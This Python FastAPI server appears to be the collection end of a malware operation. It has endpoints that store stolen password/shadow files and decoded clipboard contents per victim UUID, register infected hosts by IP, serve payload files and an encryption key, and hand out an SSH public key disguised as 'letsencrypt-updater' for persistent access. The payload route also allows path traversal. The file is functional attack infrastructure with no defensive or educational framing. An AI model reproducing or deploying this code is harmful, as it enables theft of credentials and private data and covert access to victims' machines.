import uvicorn
from fastapi import FastAPI, File, Request
from fastapi.responses import FileResponse
from pydantic import BaseModel
import os
import uuid as uuid_lib
from datetime import datetime
import shutil
import io
import logging
import sqlite3
import base64

# db
from sql import SQL

# set cwd to the directory of the script
os.chdir(os.path.dirname(os.path.abspath(__file__)))
app = FastAPI()

# encryption key:
encryption_key = "LunaLovesHackingHellYeah"

logger = logging.getLogger('uvicorn.error')
logger.setLevel(logging.DEBUG)

# database
db = SQL()


import signal
def exit_gracefully(*args):
    print("exiting")
    db.close()
    exit(0)



# Pydantic model to accept the JSON structure with uuid and raw_file
class RequestData(BaseModel):
    uuid: str
    data: str  # assuming the raw_file will be a base64 encoded string
    kind: str
    
class HostData(BaseModel):
    uuid: str

# Helper function to save the file
def save_file(uuid_str: str, raw_file_data: str, kind: str = "shadow"):
    # Create the directory if it doesn't exist
    directory = f'./files/{uuid_str}/{kind}'
    os.makedirs(directory, exist_ok=True)
    
    # Set file name and path
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    
    file_data = io.BytesIO(raw_file_data.encode('utf-8'))
    
    # Save the file with timestamped name
    file_path = os.path.join(directory, f"{timestamp}.txt")
    with open(file_path, 'wb') as f:
        shutil.copyfileobj(file_data, f)
    return file_path

@app.post("/passwords")
async def handle_test(request_data: RequestData):
    # Retrieve uuid and raw_file from the request
    uuid_str = request_data.uuid
    data = request_data.data
    kind = request_data.kind

    # Save the file and generate the path
    file_path = save_file(uuid_str, data, kind=kind)
    return {"message": "File saved successfully", "file_path": file_path}

@app.get("/payloads")
async def get_payloads():
    # return files in the payloads directory
    return {"payloads": os.listdir("./payloads")}

@app.post("/add_hosts")
async def add_hosts(request_data: HostData, request: Request):
    # get host uuid
    uuid_str = request_data.uuid
    ip = request.client.host
    # add host uuid to hosts.txt
    db.add_host(uuid_str, ip)   
    
    return {"message": "Host added successfully"}


@app.get("/ssh-key")
async def get_payloads():
    # return files in the payloads directory
    return "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILzsn7GvHv+IPrxbcLjMHW8Yw0FnFm2SX1E5goK1M/Rx letsencrypt-updater"

@app.post("/clipboard")
async def post_clipboard(request_data: RequestData, request: Request):
    # get host uuid
    uuid_str = request_data.uuid
    data = request_data.data
    
    save_file(uuid_str, base64.b64decode(data).decode("utf-8"), kind="clipboard")

@app.get("/payloads/{payload_name}")
async def get_payload(payload_name: str):
    # return file
    return FileResponse(f"./payloads/{payload_name}")

@app.get("/key")
async def get_key():
    return encryption_key

if __name__ == "__main__":
    # handle ctrl+c
    signal.signal(signal.SIGINT, exit_gracefully)
    
    uvicorn.run(app, port=10000, host="0.0.0.0")
    
    
    # exit
    